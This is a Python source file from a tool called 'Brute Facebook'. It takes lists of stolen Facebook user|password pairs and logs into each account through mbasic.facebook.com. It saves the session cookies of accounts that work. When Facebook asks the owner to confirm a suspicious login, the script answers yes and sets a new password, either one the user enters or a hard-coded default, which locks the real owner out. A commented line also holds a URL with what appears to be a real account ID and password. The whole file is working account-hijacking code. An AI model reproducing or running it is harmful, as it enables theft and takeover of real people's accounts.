#######################################################
# Name           : Brute Facebook (BF)                #
# File           : dump.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############


import requests as r, os, re
from bs4 import BeautifulSoup as par

#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

#https://fbapi.rozhakxd.my.id/auth?email=100076380879450&pass=sayang
### WARNA MODULE RICH ###
merah  = '[#FF0022]'
pink   = '[deep_pink3]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
###########################################
class Cek_has:
    def __init__(self):
        self.aman, self.cp, self.salah = 0, 0, 0
        self.ubahP, self.pwBaru = [], []
        self.data, self.data2 = {}, {}
        self.dat, self.dat2 = {}, {}
        self.hsl_cp = []

    def gabut(self):
        try:
            xxx = os.listdir("results/CP")
            for z in xxx:
                self.hsl_cp.append(z)
        except:pass
        if len(self.hsl_cp)==0:
            prints(Panel(f"🙁 {merah}tidak ada file yang mau di cek{hapus}"));exit()
        else:
            self.xa = {}
            self.xx = 0
            prints(Panel(f"       HASIL {kuning}CP {hapus}YANG TERSIMPAN DI FOLDER ANDA"))
            for tod in self.hsl_cp:
                try:fi2 = open(f"results/CP/{tod}").readlines()
                except:continue
                self.xx+=1
                if self.xx<100:
                    nom = "0"+str(self.xx)
                    self.xa.update({str(self.xx):str(tod)})
                    self.xa.update({nom:str(self.xx)})
                    print(f"  [{O}{nom}{N}] {tod} -> {H}{str(len(fi2))}{N}")
                else:
                    self.xa.update({str(self.xx):str(tod)})
                    print(f"  [{O}{nom}{N}] {tod} -> {H}{str(len(fi2))}{N}")
        prints(Panel(f"   {biru_m}SILAHKAN PILIH NOMOR YANG MAU DI CP DETECTOR{hapus}"))
        file = input(f"  [{M}?{N}] nomor : ")
        try:ajg = self.xa[file]
        except KeyError:
            prints(Panel(f"😡 file {merah}{file}{hapus} tidak ada cek nomor nya pler"));exit()
        try:
            buka_baju = open(f"results/CP/{ajg}").readlines()
        except IOError:
            print(f"  [{M}!{N}] file tidak ada");exit()
        wwx=input(f"  [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
        if wwx in ["Y","y"]:
            self.ubahP.append("y")
            prints(Panel("Jika ingin mengubah kata sandi Ketika tab yes, gunakanlah password minimal 6 huruf. contoh: [green]yayanxd[/]"))
            pwBar=input(f"  [{H}+{N}] masukan password baru : ")
            if len(pwBar) <= 5:
                print(f"  [{M}!{N}] kata sandi minimal 6 karakter")
            else:
                self.pwBaru.append(pwBar)
        prints(Panel(f"[[bold green]+[/]] Total akun : [bold cyan]{str(len(buka_baju))}[/]"))
        for memek in buka_baju:
            kontol = memek.replace('\n', '')
            titid  = kontol.split('|')
            try:
               #  print(titid[0]+"|"+titid[1])
                self.log_hasil(titid[0].replace(" [×] ", ""), titid[1])
            except r.exceptions.ConnectionError:
                continue
            print("")
        prints(Panel("[bold green]Proses Pengecekan Selesai[/]"));exit()

    def log_hasil(self, user, pasw):
        session=r.Session()
        session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
        soup=par(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
        link=soup.find("form",{"method":"post"})
        for x in soup("input"):
            self.data.update({x.get("name"):x.get("value")})
        self.data.update({"email":user,"pass":pasw})
        urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=self.data)
        response=par(urlPost.text, "html.parser")
        if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
            print("\r Hidupkan mode pesawat")
        if "c_user" in session.cookies.get_dict():
            if "Akun Anda Dikunci" in urlPost.text:
                prints(Panel(f"""\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
😭 akun ini terpasang autentikasi dua faktor""", title=f"{merah}MENCOBA LOGIN[/]"))
            else:
                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                open('results/OK/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
                prints(Panel(f"""\r[{hijau}✓[/]] {hijau}{user}|{pasw}{hapus}
🥳 Hore akun ini tidak checkpoint""", title=f"{merah}MENCOBA LOGIN[/]"))
        elif "checkpoint" in session.cookies.get_dict():
            title=re.findall("\<title>(.*?)<\/title>",str(response))
            link2=response.find("form",{"method":"post"})
            listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
            for x in response("input"):
                if x.get("name") in listInput:
                    self.data2.update({x.get("name"):x.get("value")})
            an=session.post("https://mbasic.facebook.com"+link2.get("action"),data=self.data2)
            response2=par(an.text,"html.parser")
            cek=[cek.text for cek in response2.find_all("option")]
            if(len(cek)==0):
                if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                    if "y" in self.ubahP:
                        mmk = self.pwBaru
                        self.ubah_pw(session,response,link2,user, mmk)
                    else:
                        mmk = "YayanGanteng:v"
                        self.ubah_pw(session,response,link2,user, mmk)
                elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                    prints(Panel(f"""\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
😭 akun ini terpasang autentikasi dua faktor""", title=f"{merah}MENCOBA LOGIN[/]"))
                else:
                    prints(Panel(f"""\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
🤔 gagal login kemungkinan password sudah di ganti.""", title=f"{merah}MENCOBA LOGIN[/]"))
            else:
                self.c = 0
                for opt in range(len(cek)):
                    self.c+=1
                print(f"{str(self.c)}|{cek}")
#                    tod = f"""[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
#[{biru_m}+{hapus}] Terdapat {hijau}{str(self.c)}{hapus} opsi.
#[{pink}{i}{hapus}] [bold blue]{cek[opt]}[/]"""
 #               prints(Panel(tod, title=f"{merah}MENCOBA LOGIN[/]"))
 #               print(i)
#                    tod = f"\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}\n[{biru_m}+{hapus}] Terdapat {hijau}{str(len(cek))}{hapus} opsi.\n[{pink}{str(opt+1)}{hapus}] [bold blue]{cek[opt]}[/]"
#                   prints(Panel(tod, title=f"{merah}MENCOBA LOGIN[/]"))

        else:
            prints(Panel(f"""[{merah}>[/]] {kuning}{user}|{pasw}[/]
😔 Kata sandi salah atau sudah diubah""", title=f"{merah}MENCOBA LOGIN[/]"))

    def ubah_pw(self, session, response, link2, user, pwx):
        but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
        for x in response("input"):
            if x.get("name") in but:
                self.dat.update({x.get("name"):x.get("value")})
        ubahPw=session.post("https://mbasic.facebook.com"+link2.get("action"),data=self.dat).text
        resUbah=par(ubahPw,"html.parser")
        link3=resUbah.find("form",{"method":"post"})
        but2=["submit[Next]","nh","fb_dtsg","jazoest"]
        if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
            for b in resUbah("input"):
                if b.get("name") in but2:
                    self.dat2.update({b.get("name"):b.get("value")})
            self.dat2.update({"password_new":"".join(pwx)})
            an=session.post("https://mbasic.facebook.com"+link3.get("action"),data=self.dat2)
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OK/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(pwx)}|{coki}\n")
            prints(Panel(f"\r[{hijau}✓[/]] {hijau}{user}|{''.join(pwx)}|{coki}[/]", title=f"{hijau}TAB YES[/]"))
